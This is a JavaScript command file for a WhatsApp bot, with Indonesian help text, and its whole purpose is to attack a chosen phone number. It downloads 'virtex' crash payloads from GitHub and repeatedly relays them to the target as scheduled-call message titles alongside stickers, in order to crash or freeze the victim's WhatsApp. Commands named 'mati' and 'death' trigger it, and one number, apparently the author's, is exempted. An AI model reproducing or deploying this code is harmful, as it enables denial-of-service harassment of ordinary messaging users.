import fs from 'fs'
import fetch from 'node-fetch'
import { sticker } from '../lib/sticker.js'
import moment from 'moment-timezone'

let handler = async (m, { conn, text, isOwner, usedPrefix, command, args }) => {
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const delay = time => new Promise(res => setTimeout(res, time))
let rifal = text.split(',')
if (rifal.length < 1) return m.reply(`> Perintah :\n${usedPrefix + command} nomor/tag`);
let u = m.quoted ? m.quoted.sender : rifal[0] ? rifal[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
if (u.startsWith(`+6283853305641`)) return m.reply('Tidak bisa bug ke nomor ini!')
if (u.startsWith(`6283853305641`)) return m.reply('Tidak bisa bug ke nomor ini!')
m.reply(wait)

let virus3 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
let virus1 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
let virus2 = await (await fetch("https://raw.githubusercontent.com/WannBotz/virus/main/virtex1.txt")).text()
let call = { scheduledCallCreationMessage: { callType: 2, scheduledTimestampMs: Date.now(), title: virus2 }}
let call1 = { scheduledCallCreationMessage: { callType: 1, scheduledTimestampMs: Date.now(), title: virus1 }}
let call2 = { scheduledCallCreationMessage: { callType: 2, scheduledTimestampMs: Date.now(), title: virus2 }}
let call3 = { scheduledCallCreationMessage: { callType: 1, scheduledTimestampMs: Date.now(), title: virus3 }}
let thumb = await fs.readFileSync('./thumbnail.jpg')

await delay(500)
conn.relayMessage(u, call1, {quoted: call3})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call1, {quoted: call3})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call1, {quoted: call3})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call2, {quoted: call1})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call3, {quoted: call2})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call1, {quoted: call3})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call2, {quoted: call1})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call3, {quoted: call2})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call1, {quoted: call3})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call2, {quoted: call1})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call3, {quoted: call2})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call1, {quoted: call3})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call2, {quoted: call1})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call3, {quoted: call2})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call1, {quoted: call3})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call2, {quoted: call1})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call3, {quoted: call2})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call1, {quoted: call3})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call2, {quoted: call1})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call3, {quoted: call2})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
conn.relayMessage(u, call1, {quoted: call3})
await delay(1500)
conn.sendMessage(u, { sticker : thumb }, { quoted: call })
await delay(1500)
await conn.sendMessage(m.chat, { text: "*_Sukses Ayang!... :v_*"}, {quoted:m})
}
handler.help = ["🗿 *<nomor target yang mau di bug>*","😂 *<nomor target yang mau di bug>*","❤ *<nomor target yang mau di bug>*","ngelek *<nomor target yang mau di bug>*","mati *<nomor target yang mau di bug>*","death *<nomor target yang mau di bug>*","turu *<nomor target yang mau di bug>*"]
handler.command = ["🗿 *<nomor target yang mau di bug>*","😂 *<nomor target yang mau di bug>*","❤ *<nomor target yang mau di bug>*","ngelek","mati","death","turu"]
handler.tags = ["bugs"]
handler.rowner = handler.premium = true
export default handler